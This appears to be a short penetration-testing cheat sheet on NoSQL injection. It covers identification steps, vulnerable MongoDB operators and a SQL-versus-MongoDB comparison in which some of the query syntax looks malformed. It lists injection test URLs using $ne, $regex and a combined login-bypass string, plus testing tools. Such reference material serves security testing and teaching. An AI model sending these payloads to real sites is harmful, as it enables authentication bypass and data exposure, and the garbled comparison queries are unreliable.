---
title: NoSQL Injection
category: Web Application
order: 5
---


> **Identification**

* Find a baseline request and response 
* Find a syntax error from the database
* Inject operators to modify query
* Inject javascript, BSON, JSON
* Access REST APIs or managment interfaces directly to database

> **Location in code**

* Usually in the $where operator
* mapReduce
* DB.eval

> **NoSQL Queries vs SQL**

MySQL | MongoDB
<code> select * from users where ID = 1; </code> | <code> db.find.user({user_id: 1,}) </code>
<code> update set users password = '[input]' where id = 1; </code> | <code> db.update.user({user_id, [#]}, {$set {password: '[input]'}}) </code>

> **NoSQL Injection: Test Location and Strings**

Not Equals | <code> http://site.org/User[$ne]=1 </code>
RegEx | <code> http://site.org/user.php?type[$regex]=.*&username[$regex]=.*
Combined | <code> http://site.org/login.php?type[$ne]=user&username[$ne]=asdf&password=asdf'||'1'=='1' %26%26 'b' == 'b </code>

> **Tools**

* NoSQLMAP 
* NoSQL Exploitation Framework
* FuzzDB list
* Burp Suite Pro
